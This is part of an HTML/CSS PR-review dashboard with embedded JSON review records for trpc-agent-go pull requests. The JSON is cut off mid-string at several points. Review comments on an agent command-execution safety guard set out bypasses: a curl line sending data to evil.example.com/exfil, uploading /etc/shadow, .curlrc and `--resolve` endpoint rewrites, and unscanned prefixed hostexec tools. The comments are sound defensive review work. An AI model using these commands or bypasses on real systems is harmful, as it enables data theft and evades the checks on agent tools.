.meta {
  display: flex;
  align-items: center;
  flex-wrap: wrap;
  gap: 8px;
  margin-top: 7px;
}
.badge {
  gap: 7px;
  min-width: 0;
  padding: 6px 11px;
  text-transform: none;
  white-space: nowrap;
}
.card-summary {
  color: #526173;
  margin-top: 9px;
}
.badge::before {
  content: "";
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: currentColor;
}
.card-body {
  background: #fff;
  padding: 0 18px 18px;
}
.grid {
  grid-template-columns: 1fr;
  gap: 10px;
}
.field {
  background: #fbfcfe;
  border-color: #e6ecf3;
  padding: 13px 14px;
}
.field strong {
  color: #536175;
  font-size: 11px;
  letter-spacing: 0;
  text-transform: uppercase;
}
.field-body {
  color: #1f2937;
  line-height: 1.62;
}
.comment {
  background: #fff8ed;
  border-left-color: var(--accent-2);
  color: #1f2937;
}
.comment-head {
  color: #1f2937;
}
.pr-readout {
  grid-template-columns: minmax(0, 1fr);
  gap: 18px;
}
.story-block {
  border-top-color: #e2e8f0;
}
.story-block.hero-block {
  background: linear-gradient(180deg, #fbfffe, #f7fbfa);
  border-color: #d5e7e4;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.72);
}
.story-block h4,
.review-rail h4,
.comments-panel h4 {
  font-size: 13px;
  font-weight: 900;
}
.story-line {
  grid-template-columns: 116px minmax(0, 1fr);
  border-top-color: #e9eef5;
}
.story-label {
  color: #607086;
}
.review-rail {
  border: 1px solid #e3eaf2;
  border-radius: 8px;
  padding: 14px;
  background: #fbfcfe;
}
.review-rail .fact-list {
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
}
.fact {
  border-top-color: #e8eef5;
}
.comments-panel {
  border-top-color: #e2e8f0;
}
.comment-list {
  gap: 12px;
}
.skip-group {
  box-shadow: var(--shadow);
}
.skip-group-head {
  align-items: center;
  background: linear-gradient(180deg, #fff, #fbfcfe);
}
.skip-row {
  grid-template-columns: minmax(0, 1.15fr) minmax(220px, 0.85fr);
}
.blocker-item {
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.75);
}
.empty {
  background: #fff;
  box-shadow: var(--shadow);
}
@media (max-width: 840px) {
  .topbar, .card-head { grid-template-columns: 1fr; display: grid; }
  .card-actions { align-items: flex-start; flex-direction: row; flex-wrap: wrap; }
  .dashboard, .grid, .metrics { grid-template-columns: 1fr; }
  .guide-grid { grid-template-columns: 1fr; }
  .headline-row { align-items: flex-start; flex-direction: column; }
  .pr-readout { grid-template-columns: 1fr; }
  .review-rail { position: static; }
  .story-line { grid-template-columns: 1fr; gap: 4px; }
  .timeline-item { grid-template-columns: 1fr; }
  .controls { position: static; }
  .utilities { width: 100%; margin-left: 0; }
  .utility-button { flex: 1 1 auto; }
  .skip-row { grid-template-columns: 1fr; }
}
</style>
</head>
<body>
<div class="shell">
  <div class="topbar">
    <div>
      <h1 data-i18n="title">MyCR 审核报告</h1>
      <p class="subtitle" id="subtitle"></p>
    </div>
    <div class="toggle" aria-label="Language">
      <button type="button" data-lang-button="zh" class="active">中文</button>
      <button type="button" data-lang-button="en">EN</button>
    </div>
  </div>
  <section class="metrics" id="metrics"></section>
  <section class="dashboard">
    <div class="panel">
      <h2 data-i18n="statusDistribution">状态分布</h2>
      <div class="bars" id="bars"></div>
    </div>
    <div class="panel">
      <h2 data-i18n="timeline">执行时间线</h2>
      <div class="timeline" id="timeline"></div>
    </div>
  </section>
  <section class="panel" id="overviewPanel" style="display: none; margin-top: 16px;">
    <h2 data-i18n="overviewSection">整体摘要</h2>
    <div class="overview-content" id="overviewContent"></div>
  </section>
  <section class="panel reading-guide" id="readingGuidePanel" style="display: none;">
    <div class="guide-head">
      <h2 data-i18n="readingGuide">阅读建议</h2>
      <span data-i18n="readingGuideHint">先看高风险和高影响 PR</span>
    </div>
    <div class="guide-grid" id="readingGuide"></div>
  </section>
  <section class="controls">
    <input class="search" id="search" type="search">
    <div class="chips" id="chips"></div>
    <div class="utilities">
      <button type="button" class="utility-button" id="openAll"></button>
      <button type="button" class="utility-button" id="closeAll"></button>
    </div>
  </section>
  <section class="section-heading">
    <h2 data-i18n="reviewedSection">已处理 PR</h2>
    <div class="hint" data-i18n="reviewedHint">点击卡片查看细节</div>
  </section>
  <main class="cards" id="cards"></main>
  <section class="section-heading" id="skippedHeading">
    <h2 data-i18n="skippedGroups">未审核 PR 分类</h2>
    <div class="hint" data-i18n="skippedHint">按排除原因分组</div>
  </section>
  <section class="skip-groups" id="skipGroups"></section>
  <section class="section-heading" id="followUpHeading">
    <h2 data-i18n="followUpSection">后续关注</h2>
    <div class="hint" data-i18n="followUpHint">接近可处理但仍有阻塞</div>
  </section>
  <section class="cards" id="followUpCards"></section>
  <div class="footer" id="footer"></div>
</div>

ad SHA has not changed since the previous blocker was posted."},{"kind":"human_review","latest_response":"xiaosansh / COMMENTED","line":355,"path":"session/replaytest/harness.go","reviewer":"xiaosansh","summary":"Open current review thread at session/replaytest/harness.go:355; latest comment by xiaosansh at 2026-07-02T11:30:38Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."},{"kind":"human_review","latest_response":"WineChord / CHANGES_REQUESTED","line":130,"path":"session/replaytest/cases.go","reviewer":"WineChord","summary":"Open current review thread at session/replaytest/cases.go:130; latest comment by WineChord at 2026-07-03T02:37:09Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."},{"kind":"human_review","latest_response":"WineChord / CHANGES_REQUESTED","line":258,"path":"session/replaytest/harness.go","reviewer":"WineChord","summary":"Open current review thread at session/replaytest/harness.go:258; latest comment by WineChord at 2026-07-03T02:37:09Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."}],"ci_state":"checks: pass:166, pending:0, fail:0, skipped:0; merge:MERGEABLE; review:CHANGES_REQUESTED","design_assessment":"Verified `CaseSummaryWithFilterKey` events and memory step execution paths, then posted two blockers.","head_sha":"63b9ec36e6c9ad00f53b46b53a57413f10256026","inline_comments":[{"body":"This case now creates a `FilterKey: \"branch\"` summary, but the events it summarizes still have empty `Event.FilterKey`. A backend can drop keyed event metadata and still pass this built-in case, so the previous filter-key coverage gap is only partially closed. Please set these c14 events to the same filter key and assert the keyed summary/session boundary reflects those keyed events.\n\n<details><summary>中文<\/summary>\n这个 case 现在创建了 `FilterKey: \"branch\"` 的 summary，但参与摘要的事件本身仍然没有设置 `Event.FilterKey`。这样后端即使丢掉 keyed event 元数据，内置 case 仍可能通过，之前的 filter-key 覆盖缺口只修了一半。建议把这组 c14 event 也设成同一个 filter key，并断言 keyed summary/session boundary 真的覆盖这些 keyed events。\n<\/details>","line":null,"path":"session/replaytest/cases.go","summary":"This case now creates a `FilterKey: \"branch\"` summary, but the events it summarizes still have empty `Event.FilterKey`. A backend can drop keyed event metadata and still pass this built-in case, so the previous filter-key coverage gap is only partially closed. Please set these c14 events to the same filter key and assert the keyed summary/session boundary reflects those keyed events.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2051#discussion_r3517127689"},{"body":"Memory steps still silently no-op when `MemoryService` is nil. That means a custom or future replay case can forget `RequiredCaps.NeedsMemory` and still report success without running `AddMemoryStep` / `SearchMemoryStep`, the same false-pass class this PR fixed for track steps. Please return an execution error here (and in search) or derive/validate required capabilities from the step list before execution.\n\n<details><summary>中文<\/summary>\n`MemoryService == nil` 时 memory step 仍然直接 no-op。这样自定义或未来新增的 replay case 如果漏填 `RequiredCaps.NeedsMemory`，`AddMemoryStep` / `SearchMemoryStep` 实际没有运行也会报告成功，和本 PR 已经修掉的 track step 假通过属于同一类问题。建议这里和 search memory 分支都返回执行错误，或者在执行前从 step 列表自动推导/校验 required capabilities。\n<\/details>","line":null,"path":"session/replaytest/harness.go","summary":"Memory steps still silently no-op when `MemoryService` is nil. That means a custom or future replay case can forget `RequiredCaps.NeedsMemory` and still report success without running `AddMemoryStep` / `SearchMemoryStep`, the same false-pass class this PR fixed for track steps. Please return an execution error here (and in search) or derive/validate required capabilities from the step list before execution.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2051#discussion_r3517127691"}],"number":2051,"outcome":"Rechecked the current head and current review threads; no duplicate GitHub comment was posted because the existing blocker still applies to the same head.","problem":"FilterKey event coverage and missing memory-service handling still allow false-pass replay cases.","problem_framing":"FilterKey event coverage and missing memory-service handling still allow false-pass replay cases.","review_body":"Thanks for the revision. Two false-pass paths remain in the replay harness.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2051#pullrequestreview-4622362381","risk":"Backends can pass replay while losing keyed event metadata or skipping memory writes/searches entirely.","root_cause":"FilterKey event coverage and missing memory-service handling still allow false-pass replay cases.","status":"blocked_rechecked","technical_background":"session/replaytest must catch backend consistency loss rather than silently passing missing capability or keyed-summary cases","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"session/replaytest: add multi-backend replay consistency test framework","url":"https://github.com/trpc-group/trpc-agent-go/pull/2051"},{"approach":"Verified `NewNamedToolSet` prefixes hostexec tools and inspected network/path scanner logic, then posted three blockers.","attention_points":["Submitted REQUEST_CHANGES review; review URL: https://github.com/trpc-group/trpc-agent-go/pull/2050#pullrequestreview-4622363279","本轮重新确认 head SHA 未变化，已有 blocker 仍挂在当前 diff 上，因此没有重复发送相同评论。"],"author":"d2bz","blockers":[{"kind":"bot_review","latest_response":"coderabbitai / COMMENTED","line":41,"path":"tool/safety/rules.go","reviewer":"coderabbitai","summary":"Open current review thread at tool/safety/rules.go:41; latest comment by coderabbitai at 2026-07-02T03:22:11Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."},{"kind":"human_review","latest_response":"WineChord / CHANGES_REQUESTED","line":57,"path":"tool/safety/permission.go","reviewer":"WineChord","summary":"Open current review thread at tool/safety/permission.go:57; latest comment by WineChord at 2026-07-03T02:37:31Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."},{"kind":"human_review","latest_response":"WineChord / CHANGES_REQUESTED","line":297,"path":"tool/safety/rules.go","reviewer":"WineChord","summary":"Open current review thread at tool/safety/rules.go:297; latest comment by WineChord at 2026-07-03T02:37:31Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."},{"kind":"human_review","latest_response":"WineChord / CHANGES_REQUESTED","line":205,"path":"tool/safety/rules.go","reviewer":"WineChord","summary":"Open current review thread at tool/safety/rules.go:205; latest comment by WineChord at 2026-07-03T02:37:31Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."}],"ci_state":"checks: pass:162, pending:0, fail:0, skipped:0; merge:MERGEABLE; review:CHANGES_REQUESTED","design_assessment":"Verified `NewNamedToolSet` prefixes hostexec tools and inspected network/path scanner logic, then posted three blockers.","head_sha":"a4f424f7621969e1aa736c3df5a567940a5ea3b1","inline_comments":[{"body":"The default mapping only recognizes raw `exec_command`, but tools coming from a normal `hostexec.NewToolSet` are wrapped by `NewNamedToolSet` and exposed as `hostexec_exec_command`. Those calls become `BackendUnknown` and return allow without scanning/audit, so the documented hostexec path can bypass the guard. Please include the prefixed hostexec names or derive the backend from the resolved semantic tool/toolset, and add a regression using `hostexec.NewToolSet` through `WithToolSets`.\n\n<details><summary>中文<\/summary>\n这里默认只识别裸的 `exec_command`，但正常通过 `hostexec.NewToolSet` 注册时会被 `NewNamedToolSet` 包成 `hostexec_exec_command`。这些调用会落到 `BackendUnknown` 并直接 allow，不会进入扫描或审计，导致文档里的 hostexec 路径绕过 guard。建议补上 prefixed hostexec 名称，或者从 resolved semantic tool/toolset 推导 backend，并加一个 `hostexec.NewToolSet` + `WithToolSets` 的回归测试。\n<\/details>","line":null,"path":"tool/safety/permission.go","summary":"The default mapping only recognizes raw `exec_command`, but tools coming from a normal `hostexec.NewToolSet` are wrapped by `NewNamedToolSet` and exposed as `hostexec_exec_command`. Those calls become `BackendUnknown` and return allow without scanning/audit, so the documented hostexec path can bypass the guard. Please include the prefixed hostexec names or derive the backend from the resolved semantic tool/toolset, and add a regression using `hostexec.NewToolSet` through `WithToolSets`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128454"},{"body":"The network rule extracts only the first target host, then allows the entire command when that host is allowlisted. `curl https://github.com/ok https://evil.example.com/exfil` therefore passes because only `github.com` is evaluated. Please extract and evaluate all network targets, denying/asking if any target is non-allowlisted or unknown.\n\n<details><summary>中文<\/summary>\n网络规则这里只取第一个目标 host，只要它在 allowlist 里就允许整条命令。比如 `curl https://github.com/ok https://evil.example.com/exfil` 只会检查 `github.com`，第二个非白名单目标会被放过。建议提取并检查所有网络目标，只要有任意目标不在白名单或无法确定，就 deny/ask。\n<\/details>","line":null,"path":"tool/safety/rules.go","summary":"The network rule extracts only the first target host, then allows the entire command when that host is allowlisted. `curl https://github.com/ok https://evil.example.com/exfil` therefore passes because only `github.com` is evaluated. Please extract and evaluate all network targets, denying/asking if any target is non-allowlisted or unknown.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128457"},{"body":"Denied-path scanning skips all flag tokens, so file operands embedded in options are missed: `@/etc/shadow`, `name=@/etc/shadow`, or `--output=/etc/shadow` never reach `matchesDeniedPath`. An allowlisted network command can therefore upload or overwrite sensitive paths, e.g. `curl --data-binary @/etc/shadow https://github.com/upload`. Please expand path candidates from option values and curl-style upload/file syntaxes before matching denied path patterns.\n\n<details><summary>中文<\/summary>\ndenied-path 扫描会跳过所有 flag token，因此嵌在选项里的文件操作数不会被检查：`@/etc/shadow`、`name=@/etc/shadow`、`--output=/etc/shadow` 都不会进入 `matchesDeniedPath`。这样白名单网络命令仍可以上传或覆盖敏感路径，例如 `curl --data-binary @/etc/shadow https://github.com/upload`。建议从选项值和 curl 上传/文件语法里展开 path candidates，再做 denied path 匹配。\n<\/details>","line":null,"path":"tool/safety/rules.go","summary":"Denied-path scanning skips all flag tokens, so file operands embedded in options are missed: `@/etc/shadow`, `name=@/etc/shadow`, or `--output=/etc/shadow` never reach `matchesDeniedPath`. An allowlisted network command can therefore upload or overwrite sensitive paths, e.g. `curl --data-binary @/etc/shadow https://github.com/upload`. Please expand path candidates from option values and curl-style upload/file syntaxes before matching denied path patterns.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2050#discussion_r3517128459"}],"number":2050,"outcome":"Rechecked the current head and current review threads; no duplicate GitHub comment was posted because the existing blocker still applies to the same head.","problem": ed issue closure.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2049#discussion_r3517130918"}],"number":2049,"outcome":"Rechecked the current head and current review threads; no duplicate GitHub comment was posted because the existing blocker still applies to the same head.","problem":"`concurrent_retry_writes` uses successful duplicate-content writes and does not validate retry recovery.","problem_framing":"`concurrent_retry_writes` uses successful duplicate-content writes and does not validate retry recovery.","review_body":"The previous SummaryBoundary concern is addressed, but the new retry case does not yet validate retry/idempotency behavior.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2049#pullrequestreview-4622366095","risk":"A backend that creates duplicate memory on retry can still pass while the PR claims to close the retry issue.","root_cause":"`concurrent_retry_writes` uses successful duplicate-content writes and does not validate retry recovery.","status":"blocked_rechecked","technical_background":"replay consistency harness should only claim retry/idempotency coverage when it exercises a real retry/anomaly path","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"test: add replay consistency harness","url":"https://github.com/trpc-group/trpc-agent-go/pull/2049"},{"approach":"Verified current curl parser, option handling, and tests, then posted two blockers.","attention_points":["Submitted REQUEST_CHANGES review; review URL: https://github.com/trpc-group/trpc-agent-go/pull/2045#pullrequestreview-4622364111","本轮重新确认 head SHA 未变化，已有 blocker 仍挂在当前 diff 上，因此没有重复发送相同评论。"],"author":"everfid-ever","blockers":[{"kind":"human_review","latest_response":"WineChord / CHANGES_REQUESTED","line":345,"path":"tool/safety/rules.go","reviewer":"WineChord","summary":"Open current review thread at tool/safety/rules.go:345; latest comment by WineChord at 2026-07-03T02:37:50Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."},{"kind":"human_review","latest_response":"WineChord / CHANGES_REQUESTED","line":802,"path":"tool/safety/rules.go","reviewer":"WineChord","summary":"Open current review thread at tool/safety/rules.go:802; latest comment by WineChord at 2026-07-03T02:37:50Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."}],"ci_state":"checks: pass:162, pending:0, fail:0, skipped:0; merge:MERGEABLE; review:CHANGES_REQUESTED","design_assessment":"Verified current curl parser, option handling, and tests, then posted two blockers.","head_sha":"47fbe0f9fa69762442167567276d22da09bfda7d","inline_comments":[{"body":"This only fails closed for explicit `-K/--config`, but curl also reads the implicit default `.curlrc` unless `-q/--disable` is the first curl option. A whitelisted command such as `curl https://github.com/a` can still apply config-supplied `url`, `proxy`, or `resolve` entries and reach a non-whitelisted endpoint without triggering the network rule. Please fail closed/ask for curl unless config loading is disabled first, or otherwise prove the runtime clears curl config; add a regression with `HOME/.curlrc` defining an evil `url`/`resolve`.\n\n<details><summary>中文<\/summary>\n这里只对显式 `-K/--config` fail closed，但 curl 默认还会读取 `.curlrc`，除非第一个 curl option 是 `-q/--disable`。因此 `curl https://github.com/a` 这种白名单命令仍可能被配置文件里的 `url`、`proxy`、`resolve` 改到非白名单 endpoint，网络规则不会发现。建议除非先禁用配置加载，否则 curl 进入 fail closed/ask；或者证明运行环境会清空 curl config，并加一个 `HOME/.curlrc` 配置恶意 `url`/`resolve` 的回归测试。\n<\/details>","line":null,"path":"tool/safety/rules.go","summary":"This only fails closed for explicit `-K/--config`, but curl also reads the implicit default `.curlrc` unless `-q/--disable` is the first curl option. A whitelisted command such as `curl https://github.com/a` can still apply config-supplied `url`, `proxy`, or `resolve` entries and reach a non-whitelisted endpoint without triggering the network rule. Please fail closed/ask for curl unless config loading is disabled first, or otherwise prove the runtime clears curl config; add a regression with `HOME/.curlrc` defining an evil `url`/`resolve`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2045#discussion_r3517129201"},{"body":"`--resolve github.com:443:2001:db8::1` is accepted by curl, but this helper splits on every colon and drops the unbracketed IPv6 address into non-host fragments. The scanner keeps only the allowlisted `github.com`, so the endpoint rewrite bypasses `R-NET-001`. Please parse `--resolve` with option-specific `host:port:addr[,addr]` logic that preserves the full address tail, including unbracketed IPv6 and `+host` forms, and add deny tests for both.\n\n<details><summary>中文<\/summary>\n`curl --resolve github.com:443:2001:db8::1 ...` 是 curl 接受的格式，但这里按每个冒号切分，会把未加方括号的 IPv6 地址拆碎并丢掉。最终只剩白名单里的 `github.com`，实际 endpoint rewrite 就绕过了 `R-NET-001`。建议针对 `--resolve` 单独解析 `host:port:addr[,addr]`，保留完整 addr tail，包括未加方括号的 IPv6 和 `+host` 形式，并补 deny 测试。\n<\/details>","line":null,"path":"tool/safety/rules.go","summary":"`--resolve github.com:443:2001:db8::1` is accepted by curl, but this helper splits on every colon and drops the unbracketed IPv6 address into non-host fragments. The scanner keeps only the allowlisted `github.com`, so the endpoint rewrite bypasses `R-NET-001`. Please parse `--resolve` with option-specific `host:port:addr[,addr]` logic that preserves the full address tail, including unbracketed IPv6 and `+host` forms, and add deny tests for both.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2045#discussion_r3517129203"}],"number":2045,"outcome":"Rechecked the current head and current review threads; no duplicate GitHub comment was posted because the existing blocker still applies to the same head.","problem":"Implicit `.curlrc` and unbracketed IPv6 `--resolve` can still hide non-allowlisted endpoints.","problem_framing":"Implicit `.curlrc` and unbracketed IPv6 `--resolve` can still hide non-allowlisted endpoints.","review_body":"The curl-specific parser fixes several cases, but two bypasses remain.","review_url":"https://github.com/trpc-group/trpc-agent-go/pull/2045#pullrequestreview-4622364111","risk":"A command that appears to target an allowlisted host can route to another endpoint.","root_cause":"Implicit `.curlrc` and unbracketed IPv6 `--resolve` can still hide non-allowlisted endpoints.","status":"blocked_rechecked","technical_background":"curl parsing must fail closed for hidden config and endpoint rewrites","tests_docs":"验证方式：GitHub effective checks/head 状态 + 本地 diff/source inspection；仅 #2062 合入前额外跑了本地目标包测试。","title":"feat: add tool execution safety guard for secure command scanning and…","url":"https://github.com/trpc-group/trpc-agent-go/pull/2045"},{"approach":"Verified approval_service.go, then posted three blockers.","attention_points":["Submitted REQUEST_CHANGES review; review URL: https://github.com/trpc-group/trpc-agent-go/pull/2041#pullrequestreview-4622367301","本轮重新确认 head SHA 未变化，已有 blocker 仍挂在当前 diff 上，因此没有重复发送相同评论。"],"author":"Rememorio","blockers":[{"kind":"human_review","latest_response":"Rememorio / COMMENTED","line":178,"path":"evolution/auto_expire.go","reviewer":"Rememorio","summary":"Open current review thread at evolution/auto_expire.go:178; latest comment by Rememorio at 2026-06-30T08:49:12Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."},{"kind":"human_review","latest_response":"WineChord / COMMENTED","line":382,"path":"evolution/auto_expire.go","reviewer":"WineChord","summary":"Open current review thread at evolution/auto_expire.go:382; latest comment by WineChord at 2026-07-02T04:31:01Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."},{"kind":"human_review","latest_response":"WineChord / CHANGES_REQUESTED","line":54,"path":"evolution/approval_service.go","reviewer":"WineChord","summary":"Open current review thread at evolution/approval_service.go:54; latest comment by WineChord at 2026-07-03T02:38:55Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."},{"kind":"human_review","latest_response":"WineChord / CHANGES_REQUESTED","line":67,"path":"evolution/approval_service.go","reviewer":"WineChord","summary":"Open current review thread at evolution/approval_service.go:67; latest comment by WineChord at 2026-07-03T02:38:55Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."},{"kind":"human_review","latest_response":"WineChord / CHANGES_REQUESTED","line":337,"path":"evolution/approval_service.go","reviewer":"WineChord","summary":"Open current review thread at evolution/approval_service.go:337; latest comment by WineChord at 2026-07-03T02:38:55Z.","verification":"The thread still maps to the current diff in the lightweight GraphQL audit and the PR head SHA has not changed since the previous blocker was posted."}],"ci_state":"checks: pass:162, pending:0, fail:0, skipped:0; merge:MERGEABLE; review:CHANGES_REQUESTED","design_assessment":"Verified approval_service.go, then posted three blockers.","head_sha":"cde8ca25dbf974fcf69f008adfbed17989ff4ee5","inline_comments":[{"body":"`approvalDecisionLocks` is process-local, but the real approval paths can run in different processes: the `openclaw evolution approve/reject` CLI and the runtime sweeper can both read `pending_approval` and then publish/write conflicting decisions. The serialization/CAS needs to live in the `CandidateStore` layer or a filesystem lock per revision, with status re-read under that lock and `ErrAlreadyDecided` returned before publishing if the status changed.\n\n<details><summary>中文<\/summary>\n`approvalDecisionLocks` 只是进程内锁，但真实路径里 CLI 的 `openclaw evolution approve/reject` 和 runtime sweeper 可能在不同进程中运行，二者仍然可以同时读到 `pending_approval`，随后 publish/write 出相互冲突的决策。这里需要把序列化/CAS 放到 `CandidateStore` 层，或者用按 revision 的文件锁；在锁内重读状态，如果已经变化，要在 publish 前返回 `ErrAlreadyDecided`。\n<\/details>","line":null,"path":"evolution/approval_service.go","summary":"`approvalDecisionLocks` is process-local, but the real approval paths can run in different processes: the `openclaw evolution approve/reject` CLI and the runtime sweeper can both read `pending_approval` and then publish/write conflicting decisions. The serialization/CAS needs to live in the `CandidateStore` layer or a filesystem lock per revision, with status re-read under that lock and `ErrAlreadyDecided` returned before publishing if the status changed.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#discussion_r3517131847"},{"body":"Even within one process, this key serializes by revision, not by skill. Two pending revisions for the same skill can be promoted concurrently and race over the publisher, archive, and active pointer, which can leave the older revision active or archive a newer human-approved revision. Please serialize state-changing approval/rollback operations per `SkillID`, or make active-pointer updates transactional with revision status changes.\n\n<details><summary>中文<\/summary>\n即使只看单进程，这个 key 也是按 revision 串行，而不是按 skill 串行。同一个 skill 的两个 pending revision 仍可能并发 promote，并在 publisher、archive、active pointer 上竞争，可能导致旧 revision 变成 active，或把更新的人审 revision archive 掉。建议按 `SkillID` 串行所有会改状态的 approve/rollback，或者把 active pointer 更新和 revision 状态变更做成事务。\n<\/details>","line":null,"path":"evolution/approval_service.go","summary":"Even within one process, this key serializes by revision, not by skill. Two pending revisions for the same skill can be promoted concurrently and race over the publisher, archive, and active pointer, which can leave the older revision active or archive a newer human-approved revision. Please serialize state-changing approval/rollback operations per `SkillID`, or make active-pointer updates transactional with revision status changes.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#discussion_r3517131851"},{"body":"Rollback still has a pointer/status consistency failure mode. If `pointer.Set` or `pointer.Clear` fails after `archiveActive` and writing the restored revision active, the previous active revision is already archived while the pointer can still reference it. Please either update pointer/status atomically or restore both current and target revision statuses on pointer failure, and add tests for `Set` and `Clear` failures.\n\n<details><summary>中文<\/summary>\nrollback 仍有 pointer/status 不一致的问题：如果 `archiveActive` 以及写入 restored revision active 之后，`pointer.Set` 或 `pointer.Clear` 失败，之前的 active revision 已经被 archive，但 pointer 可能仍指向它。建议把 pointer/status 原子更新，或者在 pointer 失败时同时恢复 current 和 target revision 状态，并补 `Set` / `Clear` 失败测试。\n<\/details>","line":null,"path":"evolution/approval_service.go","summary":"Rollback still has a pointer/status consistency failure mode. If `pointer.Set` or `pointer.Clear` fails after `archiveActive` and writing the restored revision active, the previous active revision is already archived while the pointer can still reference it. Please either update pointer/status atomically or restore both current and target revision statuses on pointer failure, and add tests for `Set` and `Clear` failures.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2041#discussion_r3517131852"}],"number":2041,"outcome":"Rechecked the current head and current review threads; no duplicate GitHub comment was posted because the existing blocker still applies to the same head.","problem":"The n title":"memory/deepsearch: add progressive DeepSearch","updated_at":"2026-06-27T01:08:19.000Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2010"},"2017":{"author":"shanghai-Jerry","base_ref":"main","blockers":[{"kind":"human_review","line":0,"path":"memory/mysqlvec/service.go","summary":"This branch detects a soft-deleted target row in hard-delete mode, but it never removes that row before the later plain `INSERT`. If `newID` points to a residual soft-deleted row, the function deletes the source and then hits a duplicate primary key on insert, instead of the documented \"physically removed before INSERT\" behavior. Please delete the locked target row in the `!s.opts.softDelete` branch, or return a conflict before modifying the source; add a hard-delete test where the pre-check returns `active=false`.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2017#discussion_r3517130452"}],"checks_fingerprint":"cf78cd0fd63cedc175469257","comments_fingerprint":"2ecf64ae19eb3b30224f80f3","head_ref":"fix/rotate-memory-soft-delete","head_sha":"27d1686b4c5f6a0841dddf5104713c64828f1d1f","is_draft":false,"is_wip":false,"labels":[],"last_action":"heavy_review","last_heavy_reviewed_head_sha":"27d1686b4c5f6a0841dddf5104713c64828f1d1f","last_verified_at":"2026-07-03T02:54:50.342Z","latest_activity_at":"2026-07-03T02:38:23.000Z","ledger_bucket":"eligible_candidate","mergeable":"MERGEABLE","metadata_cache_key":"3a508b36a9ab66a502a98b6b","number":2017,"planning_reasons":["checks_changed","review_threads_changed","comments_changed","mergeability_changed","updated_after_watermark"],"review_decision":"CHANGES_REQUESTED","review_threads_fingerprint":"bae3ece69b5ac263061221f0","state":"OPEN","title":"fix: use UPDATE instead of DELETE for soft delete in rotateMemory","updated_at":"2026-07-03T02:38:23.000Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2017"},"2028":{"author":"bytethm","base_ref":"main","blockers":[],"checks_fingerprint":"ca4654dc677fa258af18d8ab","comments_fingerprint":"9d8f79436898f4b16af29859","head_ref":"dynamic-workflow-orchestration","head_sha":"49befeb44a68608a962b7447c31b50fa4a05813d","is_draft":false,"is_wip":false,"labels":[],"last_action":"heavy_review","last_heavy_reviewed_head_sha":"49befeb44a68608a962b7447c31b50fa4a05813d","last_verified_at":"2026-07-03T02:54:50.342Z","latest_activity_at":"2026-07-02T11:49:10.000Z","ledger_bucket":"eligible_candidate","mergeable":"MERGEABLE","metadata_cache_key":"7908b87b80f90142b7593793","number":2028,"planning_reasons":["checks_changed","review_threads_changed","comments_changed","mergeability_changed"],"review_decision":"CHANGES_REQUESTED","review_threads_fingerprint":"fbb0fedcb550c7e42c596410","state":"OPEN","title":"dynamicworkflow: add dynamic workflow orchestration","updated_at":"2026-07-02T11:25:08.000Z","url":"https://github.com/trpc-group/trpc-agent-go/pull/2028"},"2034":{"author":"hr-chang","base_ref":"main","blockers":[{"kind":"human_review","line":0,"path":"internal/session/externalization/service.go","summary":"If an `AppendEventHook` calls `next()` and then returns an error, the event may already be persisted with `ContentRef`, but this error branch deletes the saved artifacts anyway. The persisted event then points to deleted artifacts and later hydration fails. Please only cleanup when append is known not to have reached storage; if the result is ambiguous, leaving orphan artifacts is safer than deleting referenced artifacts.","url":"https://github.com/trpc-group/trpc-agent-go/pull/2034#discussion_r3517132746"},{"kind":"human_review","line":0,"path":"internal/session/externalization/service.go","summary":"`appendObserved` uses the cloned runtime session's visible `Events` as the persistence signal, but `UpdateUserSession` can filter that view to empty when there is no user message even though the backend persisted the event. First system/assistant/direct appended multimodal events can therefore persist dangling `ContentRef`s and break `GetEventWindow` / `SearchEvents` with artifact-not-found. Please replace this with a real persisted/next-called signal, or stop deleting artifacts on this ambiguous path; add regression coverage for a first non-user externalized 